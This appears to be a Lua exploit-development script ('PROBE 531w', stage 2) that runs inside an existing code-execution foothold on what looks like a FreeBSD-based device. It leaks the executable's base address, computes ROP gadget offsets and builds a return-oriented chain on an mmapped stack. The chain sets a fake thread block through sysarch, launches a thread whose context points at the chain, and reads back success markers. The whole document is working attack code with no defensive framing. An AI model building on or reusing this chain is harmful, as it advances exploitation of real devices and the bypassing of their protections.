-- CRASH_CLASS: MODERATE
-- PROBE 531w: Stage 2 — sysarch(165) TLS setup + store
--
-- S1 verified: pop_rax + pop_rdi + mov[rdi],rax works.
-- S2: add sysarch(165, SET_FSBASE=129, &tcb) before the store.

print("=== PROBE 531w: CHAIN S2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)

-- Shared + stack
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)
wq(shared, uint64(0xAAAA))       -- [0] sysarch rv
wq(shared + 8, uint64(0xBBBB))   -- [8] post-sysarch marker

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Fake TCB
local ok_t, tcb_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb_page + off, tcb_page) end
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, tcb_page)

print("shared=" .. q(shared))

-- Build chain
local chain = stack_base + 0x40000 - 0x400
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- pop rax → 165 (sysarch)
emit(uint64(165))
-- pop rdi → 129 (SET_FSBASE)
emit(pop_rdi_ret)
emit(uint64(129))
-- pop rsi → &tcb_ptr
emit(pop_rsi_ret)
emit(uint64(tcb_ptr))
-- syscall; ret → sysarch(165)
emit(syscall_ret)

-- Store sysarch rv (rax) → shared[0]
emit(pop_rdi_ret)
emit(shared)
emit(mov_rdi_rax_ret)

-- Store marker → shared[8]
emit(pop_rdi_ret)
emit(shared + 8)
emit(pop_rax_ret)
emit(uint64(0x53325F4F4B))  -- "S2_OK"
emit(mov_rdi_rax_ret)

-- Park
emit(jmp_self)

print(string.format("chain=%d bytes", i))

-- Context
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)
wq(ctx + 0x0F8, chain)

-- Spawn
print("[thr_create]")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

-- Wait
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Results
print("  sysarch_rv=" .. q(rq(shared)))
print("  marker=" .. q(rq(shared + 8)))

local m = rq(shared + 8)
local mn = to_num(m)
if mn ~= 0 and mn ~= 0xBBBB then
    print("  S2 SUCCESS!")
else
    print("  S2 FAILED — chain crashed in sysarch")
end

print("=== 531w DONE ===")
